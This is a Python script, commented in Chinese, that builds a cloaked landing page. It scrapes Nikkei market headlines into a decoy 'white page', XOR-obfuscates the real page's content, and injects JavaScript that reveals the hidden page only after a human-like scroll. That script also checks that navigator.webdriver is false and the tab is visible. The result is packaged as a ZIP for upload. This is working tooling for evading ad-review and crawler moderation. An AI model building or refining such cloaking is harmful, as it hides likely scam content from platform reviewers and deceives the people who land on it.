import os
import random
import string
import json
import shutil
import requests
import datetime
import urllib.parse
from bs4 import BeautifulSoup

# ================= 配置区 =================
TARGET_REAL_PAGE = "index.html"  
OUTPUT_ZIP_NAME = "upload_me_v5_fixed"     
XOR_KEY = random.randint(10, 250) 
# ==========================================

class LPAutomatorV5:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        self.map = {}
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """步骤 1: 实时采集日经新闻并生成长篇白页"""
        print("📡 正在采集最新财经资讯...")
        url = "https://www.nikkei.com/news/category/market/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        try:
            res = requests.get(url, headers=headers, timeout=15)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            articles = []
            # 增加采集数量至15条，确保足够滚动高度
            for item in soup.select('article')[:15]:
                title = item.find('span', class_=lambda x: x and 'title' in x)
                summary = item.find('p')
                if title:
                    articles.append({"t": title.get_text().strip(), "s": summary.get_text().strip() if summary else "市場の動向に関する詳細な分析が進行中です..."})
            
            if not articles: raise ValueError("未能提取到有效新闻内容")

            html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>Market Insight Japan</title>
            <style>body{{font-family:sans-serif;color:#333;line-height:1.8;padding:20px;background:#f4f4f4}}
            .c{{max-width:800px;margin:auto;background:#fff;padding:40px;box-shadow:0 0 10px rgba(0,0,0,0.1)}}
            .a{{margin-bottom:30px;border-bottom:1px solid #eee;padding-bottom:20px}}
            .t{{font-size:20px;color:#003366;font-weight:bold}}</style></head><body>
            <div class="c"><h2>マーケット速報 ({datetime.date.today()})</h2>"""
            for a in articles:
                html += f"<div class='a'><div class='t'>{a['t']}</div><p>{a['s']}</p></div>"
            html += f"<div style='text-align:center;color:#999;font-size:12px'>© {datetime.date.today().year} Market Insight Japan</div></div></body></html>"
            
            with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)
            print("✅ 白页模板已同步更新。")
        except Exception as e:
            print(f"⚠️ 采集失败: {e}，正在生成备用本地模板...")
            # 备用本地静态模板逻辑
            with open(self.white_file, "w", encoding="utf-8") as f: f.write("<html><body>本地静态白页内容</body></html>")

    def scramble_and_pack(self):
        """步骤 2: 执行 V5 级多态混淆"""
        print("🔐 正在执行 V5 级逻辑混淆...")
        if not os.path.exists(self.white_file): return

        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents]) if w_soup.body else str(w_soup)
            w_title = w_soup.title.string if w_soup.title else "Market News"

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            
            # 修复：素材路径净化逻辑
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        # 去除 URL 参数如 ?v=1
                        clean_src = urllib.parse.urlparse(src).path
                        dest = os.path.join(self.dist_dir, clean_src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(clean_src): 
                            shutil.copy(clean_src, dest)

        # 核心内容 XOR 加密 (修正编码问题)
        # 建议在 index.html 中使用 id="main-content" 包裹敏感内容
        target_node = r_soup.find(id="main-content") or r_soup.body
        if not target_node:
            print("❌ 错误：index.html 结构不完整，找不到 body。")
            return

        raw_html = "".join([str(x) for x in target_node.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        
        # 随机化解密逻辑变量名
        v_data, v_key, v_res, v_check, v_root = [self._rand_str(6) for _ in range(5)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#{v_root}{{min-height:210vh;background:#fff}}</style></head>
        <body><div id="{v_root}">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{console.clear();}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: 
            f.write(final_html)

    def create_zip(self):
        """步骤 3: 压缩打包"""
        try:
            print(f"📦 正在打包产物为 {OUTPUT_ZIP_NAME}.zip...")
            shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
            print(f"✨ 流程结束！ZIP文件已生成在当前目录。")
        except Exception as e:
            print(f"❌ 打包失败: {e}")

if __name__ == "__main__":
    if not os.path.exists(TARGET_REAL_PAGE):
        print(f"❌ 错误: 找不到 {TARGET_REAL_PAGE}")
    else:
        flow = LPAutomatorV5()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
        input("\n任务结束，按回车退出...")
